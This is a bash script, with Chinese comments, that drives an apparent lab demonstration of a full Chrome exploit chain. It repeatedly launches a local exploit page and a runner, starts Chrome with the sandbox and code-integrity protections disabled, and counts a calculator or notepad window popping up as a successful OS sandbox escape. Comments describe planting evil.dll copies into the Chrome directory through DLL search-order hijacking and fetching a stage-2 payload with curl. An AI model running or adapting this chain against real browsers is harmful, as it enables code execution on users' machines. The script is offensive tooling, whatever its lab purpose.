#!/bin/bash
# run_chain.sh — 一键全链演示（v4）：循环直到 calc/notepad 弹出 = OS 沙箱逃逸
# 自包含：目标 chrome 解析顺序 CHROME_EXE 环境变量 > 仓库 shared/chrome 默认构建
#        （../../shared/chrome/chrome-win64-152.0.7977.54/chrome-win64/chrome.exe）；
#        stage-2 由 curl 同源自动拉取，零本地预置，零机器专属绝对路径。
PKG="$(cd "$(dirname "$0")" && pwd)"
cd "$PKG"
LOGS="$PKG/../logs"                 # 过程日志
RESIDUE="$LOGS/lab-residue/run"     # 历次运行残留（chrome profile/日志）
mkdir -p "$RESIDUE"
WPKG=$(cygpath -w "$PKG")           # C:\style 路径，防混斜杠
DEF_CHROME="$PKG/../../shared/chrome/chrome-win64-152.0.7977.54/chrome-win64/chrome.exe"
CHROME=$(cygpath -w "${CHROME_EXE:-$DEF_CHROME}")
[ -f "${CHROME_EXE:-$DEF_CHROME}" ] || { echo "找不到 chrome：设 CHROME_EXE=/path/to/chrome.exe（默认 $DEF_CHROME）"; exit 1; }
N=${1:-60}; T0=$(date +%s)
# runner 没跑就自动拉起（重启后一条命令即可）；runner 日志/端口文件写 CWD=RESIDUE
PORT=""
if [ -f "$RESIDUE/port.txt" ]; then P0=$(cat "$RESIDUE/port.txt"); curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$P0/run_w4.html" && PORT=$P0; fi
if [ -z "$PORT" ]; then
  taskkill //IM runner.exe //F >/dev/null 2>&1; sleep 1
  rm -f "$RESIDUE/port.txt"
  (cd "$RESIDUE" && "$PKG/runner.exe" --nolaunch >/dev/null 2>&1 &)
  for w in 1 2 3 4 5; do sleep 1; [ -f "$RESIDUE/port.txt" ] && break; done
  PORT=$(cat "$RESIDUE/port.txt" 2>/dev/null || echo 8765)
fi
echo "[chain] http://127.0.0.1:$PORT/ 服务就绪  chrome=$CHROME"
CHROMEDIR=$(dirname "${CHROME_EXE:-$DEF_CHROME}")
# 竞态器会按 handler 基址派生命名把 evil.dll 副本植进 chrome 目录（LoadLibraryW
# 搜索序）；每轮/结束清掉非发行版 DLL，绝不污染 shared/。
cleanup_planted() {
  python - "$CHROMEDIR" <<'PYEOF' 2>/dev/null
import os, sys
d = sys.argv[1]
orig = {'D3DCompiler_47.dll','chrome.dll','chrome_elf.dll','chrome_wer.dll','dxcompiler.dll',
        'dxil.dll','libEGL.dll','libGLESv2.dll','vk_swiftshader.dll','vulkan-1.dll'}
for f in os.listdir(d):
    if f.lower().endswith('.dll') and f not in orig:
        try: os.remove(os.path.join(d, f))
        except OSError: pass
PYEOF
}
trap cleanup_planted EXIT
for i in $(seq 1 $N); do
  taskkill //IM ms64.exe //F >/dev/null 2>&1; taskkill //IM chrome.exe //F >/dev/null 2>&1; taskkill //IM crashpad_oob.exe //F >/dev/null 2>&1; taskkill //IM CalculatorApp.exe //F >/dev/null 2>&1; taskkill //IM notepad.exe //F >/dev/null 2>&1; sleep 1
  cleanup_planted
  L="$LOGS/cl_W_$i.log"; rm -f "$L" 2>/dev/null
  LOGF=$(cygpath -w "$L")
  powershell.exe -NoProfile -Command "Start-Process '$CHROME' -ArgumentList ('--user-data-dir=$(cygpath -w "$RESIDUE")\\tCH$i','--no-first-run','--no-default-browser-check','--no-sandbox','--disable-features=RendererCodeIntegrity','--enable-logging','--log-file=$LOGF','http://127.0.0.1:$PORT/run_w4.html')" 2>/dev/null
  DEP=0
  for w in $(seq 1 8); do
    sleep 3
    tasklist 2>/dev/null | grep -qiE "CalculatorApp|notepad" && break
    grep -aq "DEPLOYED" "$L" 2>/dev/null && { DEP=1; break; }
    [ -n "$(grep -a FAIL "$L" 2>/dev/null | head -1)" ] && break
  done
  if tasklist 2>/dev/null | grep -qiE "CalculatorApp|notepad"; then
    echo "=== FULL-CHAIN WIN round$i ($(( $(date +%s)-T0 ))s) — calc/notepad 已弹出 ==="; exit 0
  fi
  [ "$DEP" -eq 0 ] && { echo "round$i fail-fast"; continue; }
  for t in $(seq 1 12); do
    sleep 4
    tasklist 2>/dev/null | grep -qiE "CalculatorApp|notepad" && { echo "=== FULL-CHAIN WIN round$i ($(( $(date +%s)-T0 ))s) ==="; exit 0; }
  done
  echo "round$i dep-miss"
done
echo "no win in $N rounds"
